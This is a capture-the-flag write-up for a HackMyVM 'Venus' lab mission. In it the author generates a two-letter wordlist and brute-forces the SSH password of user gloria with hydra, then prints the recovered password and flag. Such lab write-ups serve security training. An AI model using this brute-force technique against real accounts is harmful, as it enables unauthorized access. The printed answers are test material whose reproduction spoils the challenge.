# Mission 0x35

## 🔎 Solution
After logging in via SSH as **maia**, the next goal was to bruteforce the final 2 missing characters of a password.
```
maia@venus:~$ cat mission.txt 
################
# MISSION 0x35 #
################

## EN ##
The user gloria has forgotten the last 2 characters of her password ... They only remember that they were 2 lowercase letters. 
```

The `forget` file shows the pattern, confirming that only the last two characters are unknown:
```
maia@venus:~$ cat forget 
v7xUVE2e5bjUc??
```

Since the missing part consists of two lowercase letters (`a–z`), I generated a full wordlist by iterating through all possible combinations:
```
for i in {a..z}{a..z}; do echo "v7xUVE2e5bjUc$i"; done > wordlist.txt
```

The resulting `wordlist.txt` looks like this:
```
> cat wordlist.txt            
v7xUVE2e5bjUcaa
v7xUVE2e5bjUcab
v7xUVE2e5bjUcac
v7xUVE2e5bjUcad
v7xUVE2e5bjUcae
v7xUVE2e5bjUcaf
v7xUVE2e5bjUcag
v7xUVE2e5bjUcah
v7xUVE2e5bjUcai
v7xUVE2e5bjUcaj
...
```

With the list prepared, I used **hydra** to bruteforce SSH for the user **gloria**. The valid password turned out to be `v7xUVE2e5bjUcxw`:
```
> hydra -l gloria -P wordlist.txt -s 5000 ssh://venus.hackmyvm.eu:5000

[5000][ssh] host: venus.hackmyvm.eu   login: gloria   password: v7xUVE2e5bjUcxw
```

Using that password, I logged in:
```
ssh gloria@venus.hackmyvm.eu -p 5000
```

Inside the home directory, the flag was waiting:
```
gloria@venus:~$ cat flagz.txt 
8===RZIkEtaEp18tLslTopJj===D~~
```

## 🚩Flag
> `8===RZIkEtaEp18tLslTopJj===D~~`
